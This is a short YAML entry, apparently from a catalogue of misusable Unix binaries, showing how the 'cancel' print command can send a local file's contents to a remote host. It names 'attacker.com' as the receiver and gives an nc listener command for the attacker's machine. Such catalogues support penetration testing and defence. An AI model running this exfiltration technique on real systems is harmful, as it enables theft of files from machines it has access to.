---
functions:
  file-upload:
    - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
---
